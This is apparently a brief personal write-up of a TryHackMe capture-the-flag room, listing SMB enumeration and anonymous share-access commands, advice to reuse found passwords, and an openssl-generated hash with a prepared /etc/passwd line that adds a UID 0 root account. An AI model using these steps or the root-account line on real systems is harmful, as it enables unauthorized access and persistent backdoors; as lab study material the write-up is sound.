So this weekend a easy room was posted on THM, and the little time I had, I spend on it.
So basic recap... I do not know basic SMB commands, so here a litte reminder:

Check basic availablity of shared

~enum4linux~
~smbclient --no-pass -L $IP~
~smbmap -H $IP~

And finally accessing without any credentials... which was my main issue:

~smbclient -N //$IP/sharename~

Which is not that hard.

Again, reuse your passwords you find.... over and over.
And finally add youselve as root. this is something everone should know :)

~openssl passwd -1 -salt user passwd~

And a prepared line for me:
#+begin_src sh :results output
echo 'robiks:$1$robiks$NNRs0eS8OdY4vaI3GJSQu0:0:0:/root/root:/bin/bash'
#+end_src
